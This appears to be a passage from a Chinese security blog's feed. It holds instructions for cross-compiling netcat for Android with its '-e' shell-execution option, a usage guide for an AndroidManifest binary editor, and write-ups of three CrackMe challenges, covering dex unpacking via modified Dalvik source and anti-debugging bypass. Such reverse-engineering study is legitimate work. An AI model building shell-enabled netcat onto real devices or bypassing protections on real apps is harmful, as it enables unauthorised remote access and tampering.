<li>gnu编译<br>搭建交叉编译环境：<br><code>apt-get install gcc-arm-linux-gnueabi libc-dev-armel-cross</code><br>修改netcat目录src文件夹下的netcat.c文件，在首部添加两个宏：#define GAPING_SECURITY_HOLE，#define TELNET。<br>在netcat目录下执行：<br><code>./configure --host=arm-linux CC=arm-linux-gnueabi-gcc CFLAGS=&quot;-static -O2&quot;</code><br><code>--prefix= /home/auo/Temp/netcat-0.7.1/out</code><br>具体路径请自行修改。<br>成功后，执行：<br><code>make -j8</code><br>成功后继续执行：<br><code>make install</code><br>生成后的netcat在/home/auo/Temp/netcat-0.7.1/out/bin/目录下，最后执行：<br><code>arm-linux-gnueabi-strip -s &#39;/home/auo/Temp/netcat-0.7.1/out/bin/netcat&#39;</code><br>strip后netcat的大小为583.1kB。</li>
<li>NDK编译<br>修改netcat目录src文件夹下的netcat.c文件，在首部添加两个宏：#define GAPING_SECURITY_HOLE，#define TELNET。<br>在netcat目录下执行：<br><code>./configure --host=arm-linux CC=arm-linux-androideabi-gcc</code><br><code>CFLAGS=&quot;-static --sysroot=/home/auo/Android/android-ndk-r10d/platforms/android-21/arch-arm -O2&quot;</code><br><code>--prefix=/home/auo/Temp/netcat-0.7.1/out</code><br>具体路径请自行修改，环境变量自行添加。<br>成功后，执行：<br><code>make -j8</code><br>成功后继续执行：<br><code>make install</code><br>生成后的netcat在/home/auo/Temp/netcat-0.7.1/out/bin/目录下，最后执行：<br><code>arm-linux-androideabi-strip -s &#39;/home/auo/Temp/netcat-0.7.1/out/bin/netcat&#39;</code><br>strip后netcat的大小为326.1kB，显而易见，使用ndk编译出的netcat体积要减小很多。</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍了如何为Android编译带-e选项的netcat。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>AmBinaryEditor（AndroidManifest二进制修改工具介绍）</title>
    <link href="http://ele7enxxh.com/AndroidManifest-Binary-Editor.html"/>
    <id>http://ele7enxxh.com/AndroidManifest-Binary-Editor.html</id>
    <published>2015-01-30T13:54:00.000Z</published>
    <updated>2016-03-23T06:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文为AmBinaryEditor项目的使用说明。<a id="more"></a></p>
<p>由于一次奇怪的需求，开始研究AndroidManifest的二进制格式，继而产生了直接修改AndroidManifest二进制格式的想法。虽然代码写的乱七八糟，不过好歹也是劳动成果。<br>在此鸣谢：MindMac对其格式的详细分析：<a href="http://bbs.pediy.com/showthread.php?t=194206" target="_blank" rel="external">http://bbs.pediy.com/showthread.php?t=194206</a></p>
<p>完整代码我已经上传到github上了：<a href="https://github.com/ele7enxxh/AmBinaryEditor" target="_blank" rel="external">https://github.com/ele7enxxh/AmBinaryEditor</a><br>vs2012，gcc均能成功编译，有相同需求的可以去下一份，下面介绍一下工具的功能和用法示例：<br>目前功能：<br><strong>新增、修改、删除指定名字的tag或者该tag的attr</strong></p>
<p>用法示例：<br>增加一个tag（-d选项指定新增tag的起始位置，如1表示添加在manifest节点之后；-c选项指定新增tag经过的节点数，以此确定新增tag的结尾位置）：</p>
<pre><code>editor tag --add activity -d 1 -c 0 -i input.xml -o output.xml
</code></pre><p>改一个tag的名字（-d选项指定要修改的tag是从manifest节点开始出现的第几个同名tag，-n选项指定tag的新名字）：</p>
<pre><code>ameditor tag --modify application -d 1 -n test -i input.xml -o output.xml
</code></pre><p>删除指定tag（-d选项指定要修改的tag是从manifest节点开始出现的第几个同名tag）：</p>
<pre><code>ameditor tag --remove application -d 1 -i input.xml -o output.xml
</code></pre><p>增加一个attr（-d选项指定要修改的tag是从manifest节点开始出现的第几个同名tag，-n选项指定attr的名字，-t选项指定attr的类型（后面会有更多介绍）-v选项指定attr的值，-r选项指定attr的属性ID（可选））：</p>
<pre><code>ameditor attr --add application -d 1 -n name -t 3 -v test -i input.xml -o output.xml
</code></pre><p>修改一个attr（-n选项指定需要修改的attr，其他同上）：</p>
<pre><code>ameditor attr -modify application -d 1 -n name -t 3 -v new -i input.xml -o output.xml
</code></pre><p>删除一个attr（-n选项指定需要删除的attr，其他同上）：</p>
<pre><code>ameditor attr -remove application -d 1 -n name -i input.xml -o output.xml
</code></pre><p>attr -t选项说明：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">enum</span></div><div class="line">&#123;</div><div class="line">	ATTR_NULL       = <span class="number">0</span>,</div><div class="line">	ATTR_REFERENCE  = <span class="number">1</span>,</div><div class="line">	ATTR_ATTRIBUTE  = <span class="number">2</span>,</div><div class="line">	ATTR_STRING     = <span class="number">3</span>,</div><div class="line">	ATTR_FLOAT      = <span class="number">4</span>,</div><div class="line">	ATTR_DIMENSION  = <span class="number">5</span>,</div><div class="line">	ATTR_FRACTION   = <span class="number">6</span>,</div><div class="line">	ATTR_FIRSTINT   = <span class="number">16</span>,</div><div class="line">	ATTR_DEC        = <span class="number">16</span>,</div><div class="line">	ATTR_HEX        = <span class="number">17</span>,</div><div class="line">	ATTR_BOOLEAN    = <span class="number">18</span>,</div><div class="line">	ATTR_FIRSTCOLOR = <span class="number">28</span>,</div><div class="line">	ATTR_ARGB8      = <span class="number">28</span>,</div><div class="line">	ATTR_RGB8       = <span class="number">29</span>,</div><div class="line">	ATTR_ARGB4      = <span class="number">30</span>,</div><div class="line">	ATTR_RGB4       = <span class="number">31</span>,</div><div class="line">	ATTR_LASTCOLOR  = <span class="number">31</span>,</div><div class="line">	ATTR_LASTINT    = <span class="number">31</span>,</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>目前暂不支持ATTR_DIMENSION和ATTR_FRACTION类型。</p>
<p><strong>2015.6.25更新</strong><br>attr -r选项说明：<br>当你所添加的attr的name在原axml中并不存在时，必须添加-r选项指定该name的resourceid，具体的resourceid在对应 Android 源码中/frameworks/base/core/res/res/values/public.xml中可以查到，另外此处需要输入十进制数。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文为AmBinaryEditor项目的使用说明。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2015移动安全挑战赛-第3题</title>
    <link href="http://ele7enxxh.com/2015-Mobile-Security-Challenge-3.html"/>
    <id>http://ele7enxxh.com/2015-Mobile-Security-Challenge-3.html</id>
    <published>2015-01-27T02:04:02.000Z</published>
    <updated>2016-03-23T06:25:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文为2015年移动安全挑战赛第三题的writeup。<a id="more"></a></p>
<p>链接：<a href="http://msc.pediy.com/timu.htm" target="_blank" rel="external">http://msc.pediy.com/timu.htm</a><br>平台：Android<br>类型：CrackMe</p>
<p>利用JEB反编译APK后发现只有一个继承Application类的StubApplication类，该类加载了动态库。很明显，dex加壳了，那么在SO里肯定回解壳的，不过SO有反调试和混淆，分析起来比较困难（好吧，至少我不想分析了）。<br>我注意到在lib/armeabi目录中的libmobisecy.so实际上是一个zip文件，解压后得到一个classes.dex文件，拖到JEB里：<br><img src="/images/2015-Mobile-Security-Challenge-3_1.png" alt="1"><br>所有的函数实体都被替换成了throw new RuntimeException();注意到的是除了函数实体，其他地方都是正确的，用010的dex模板解析也没有报错，那么我们只需要将真正的函数实体恢复就可以了，也就是修复codeOff，修复codeOff对应的字节码。（对dex结构不熟悉的童鞋，面壁去吧）</p>
<p>那么问题来了，怎么不通过调试SO就得到codeOff和其对应的字节码呢？O(∩_∩)O比忘了Android是开源的，直接修改源码，从底层那里搞出来！<br>还有一个问题，什么时候才知道该APK已经解壳了呢？这个就需要了解这种加壳方式的原理了:<br>戳这里：<a href="http://blogs.360.cn/blog/proxydelegate-application/" target="_blank" rel="external">http://blogs.360.cn/blog/proxydelegate-application/</a><br>再戳这里：<a href="http://blog.csdn.net/androidsecurity/article/details/8809542" target="_blank" rel="external">http://blog.csdn.net/androidsecurity/article/details/8809542</a><br>通过上面两篇文章我们可以知道（你不知道我也没办法），最后必定是要通过调用Application.onCreate来启动真正的逻辑的。也就是说当执行Application.onCreate时，codeOff已经修正完毕。好了现在我们开始改源码，在dalvik/vm/interp/Stack.cpp文件的dvmCallMethodV函数（因为这个函数调用了onCreate函数，函数原型：void dvmCallMethodV(Thread<em> self, const Method</em> method, Object<em> obj, bool fromJni, JValue</em> pResult, va_list args)），添加自己的逻辑：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(method-&gt;name, <span class="string">"onCreate"</span>) == <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">	ALOGD(<span class="string">"dvmCallMethodV: methodName: %s\n"</span>, method-&gt;name);</div><div class="line">	<span class="keyword">const</span> Method* thisMethod = dvmGetCurrentJNIMethod();</div><div class="line">	assert(thisMethod != <span class="literal">NULL</span>);</div><div class="line">	ClassObject* mainClazz = dvmFindClassNoInit(dvmNameToDescriptor(<span class="string">"crackme/a3/Main"</span>), thisMethod-&gt;clazz-&gt;classLoader);</div><div class="line">	ALOGD(<span class="string">"className: %s"</span>, mainClazz-&gt;descriptor);</div><div class="line">	<span class="keyword">int</span> i;</div><div class="line">    DvmDex *pDvmDex = mainClazz-&gt;pDvmDex;</div><div class="line">    DexFile *pDexFile = pDvmDex-&gt;pDexFile;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (<span class="keyword">int</span>)pDexFile-&gt;pHeader-&gt;classDefsSize; i++)</div><div class="line">    &#123;</div><div class="line">	    <span class="keyword">const</span> DexClassDef* pClassDef;</div><div class="line">	    <span class="keyword">const</span> u1* pEncodedData;</div><div class="line">	    DexClassData* pClassData;</div><div class="line">	    </div><div class="line">		pClassDef = dexGetClassDef(pDexFile, i);</div><div class="line">		pEncodedData = dexGetClassData(pDexFile, pClassDef);</div><div class="line">		pClassData = dexReadAndVerifyClassData(&amp;pEncodedData, <span class="literal">NULL</span>);</div><div class="line">		<span class="keyword">if</span> (pClassData == <span class="literal">NULL</span>)</div><div class="line">		&#123;</div><div class="line">			ALOGE(<span class="string">"Trouble reading class data\n"</span>);</div><div class="line">			<span class="keyword">return</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">int</span> j;</div><div class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; (<span class="keyword">int</span>)pClassData-&gt;header.directMethodsSize; j++)</div><div class="line">		&#123;</div><div class="line">			DexMethod *pDexDirectMethod = &amp;pClassData-&gt;directMethods[j];</div><div class="line">			ALOGD(<span class="string">"direct: classIdx: %x, methodIdx: %x, codeOff: %x"</span>, pClassDef-&gt;classIdx, pDexDirectMethod-&gt;methodIdx, pDexDirectMethod-&gt;codeOff);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; (<span class="keyword">int</span>)pClassData-&gt;header.virtualMethodsSize; j++)</div><div class="line">		&#123;</div><div class="line">			DexMethod *pDexVirtualMethod = &amp;pClassData-&gt;virtualMethods[j];</div><div class="line">			ALOGD(<span class="string">"virtual: classIdx: %x, methodIdx: %x, codeOff: %x"</span>, pClassDef-&gt;classIdx, pDexVirtualMethod-&gt;methodIdx, pDexVirtualMethod-&gt;codeOff);</div><div class="line">		&#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里面涉及到dalvik源码里的很多结构体，请自行研究。我这里只是打印出了codeOff，接下来dump和修复的工作就不再详述了，关键是思路！（ps：我的办法不是很优雅，应该有更好的思路）</p>
<p>经过上一步骤，得到了修复过好的dex，原以为这样就结束了，结果又遇到一个问题，我们先看jeb反编译出的几个关键代码吧：<br>将输入作为map的key，得到对应的value：<br><img src="/images/2015-Mobile-Security-Challenge-3_2.png" alt="2"><br>前两个字符的hashCode等于3618且字符ascii值和为168，这里推出前两个字符为s5：<br><img src="/images/2015-Mobile-Security-Challenge-3_3.png" alt="3"><br>然后就是读取两个annotation，与后面几位比较，相同则验证成功：<br><img src="/images/2015-Mobile-Security-Challenge-3_4.png" alt="4"><br>问题就出在最后这个验证，我们之前修复的是codeOff，但是没有修复annotationsOff，怎么办呢？还是改源码，直接让源码帮我们把两个annotation的值打印出来：<br>在dalvik/vm/reflect/Annotation.cpp的processAnnotationValue函数处添加自己的逻辑：</p>
<ul>
<li>在函数头部打印出className：<pre><code>ALOGD(&quot;***processAnnotationValue*** className: %s&quot;, clazz-&gt;descriptor);
</code></pre></li>
<li>在case kDexAnnotationString处打印出值：<pre><code>ALOGD(&quot;elemObj: %s&quot;, dvmCreateCstrFromString((const StringObject *)elemObj));
</code></pre></li>
</ul>
<p>得到后面的字符为：7e1p<br>最终密码为：… _____ ____. . ..___ .__.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文为2015年移动安全挑战赛第三题的writeup。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2015移动安全挑战赛-第2题</title>
    <link href="http://ele7enxxh.com/2015-Mobile-Security-Challenge-2.html"/>
    <id>http://ele7enxxh.com/2015-Mobile-Security-Challenge-2.html</id>
    <published>2015-01-27T01:34:02.000Z</published>
    <updated>2016-03-23T06:25:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文为2015年移动安全挑战赛第二题的writeup。<a id="more"></a></p>
<p>链接：<a href="http://msc.pediy.com/timu.htm" target="_blank" rel="external">http://msc.pediy.com/timu.htm</a><br>平台：Android<br>类型：CrackMe</p>
<p>Java层什么都没做，直接把输入传给了SO中的函数securityCheck进行处理，IDA attach后发现程序退出了，好吧，肯定是反调试了。这里顺便说一下检测调试的手段：</p>
<ul>
<li>读取了/proc/<pid>/status文件里面的状态和TracerId</pid></li>
<li>调用ptrace(PTRACE_TRACEME,PTRACE_ATTACH)比如子进程attach父进程，子线程traceme自己等等</li>
<li>其他奇淫技巧</li>
</ul>
<p>这道题是在JNI_OnLoad函数中进行了反调试，那么就需要在APK运行前进行调试，再次记录一下调试方法吧：</p>
<ul>
<li>准备好调试环境（IDA、adb等）</li>
<li>adb shell</li>
<li>am start -D -n com.yaotong.crackme/.MainActivity</li>
<li>使用IDA附加上该APK进程，设置加载SO时端下来，在dlopen下断点（在这里下断可以调试INIT和INIT_ARRAY的函数）</li>
<li>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</li>
<li>使IDA continue</li>
<li>此时IDA应该就会断下来，我们再在libcrackme.so的JNI_OnLoad下断点</li>
<li>单步跟踪结合IDA静态分析和F5，并在fgets处下断点，SO是通过读取/proc/pid/status文件中的Tracepid字段来判断是否有调试，如果检测到调试程序将会退出。最终，我用patch跳转指令（IDA的Edit菜单里Patch program-&gt;Change byte可以修改指令的机器码，可以改成0 0 0 0）掉了反调试：<br><img src="/images/2015-Mobile-Security-Challenge-2_1.png" alt="1"></li>
</ul>
<p>过掉反调试接下来就easy了，在Java_com_yaotong_crackme_MainActivity_securityCheck下断点，让IDA continue，最终验证逻辑就是一个简单的字符串比较：<br><img src="/images/2015-Mobile-Security-Challenge-2_2.png" alt="2"><br>最终密码为：aiyou,bucuoo</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文为2015年移动安全挑战赛第二题的writeup。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2015移动安全挑战赛-第1题</title>
    <link href="http://ele7enxxh.com/2015-Mobile-Security-Challenge-1.html"/>
    <id>http://ele7enxxh.com/2015-Mobile-Security-Challenge-1.html</id>
    <published>2015-01-26T09:33:03.000Z</published>
    <updated>2016-03-23T06:25:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文为2015年移动安全挑战赛第一题的writeup。<a id="more"></a></p>
<p>这次算是正式的参加了一次线上的比赛，所以还是记录下来。</p>
<p>链接：<a href="http://msc.pediy.com/timu.htm" target="_blank" rel="external">http://msc.pediy.com/timu.htm</a><br>平台：Android<br>类型：CrackMe</p>
<p>第一题非常简单，送分题。逻辑全部在Java层，还贴心的帮我们打了log，么么哒！<br><img src="/images/2015-Mobile-Security-Challenge-1_1.png" alt="1"><br>table是映射表，pw是正确的映射结果，enPassword是我们输入数据的映射结果，当pw==enPassword时验证成功。<br>最终的密码为：581026</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文为2015年移动安全挑战赛第一题的writeup。
    
    </summary>
    
    
  </entry>
  
</feed>
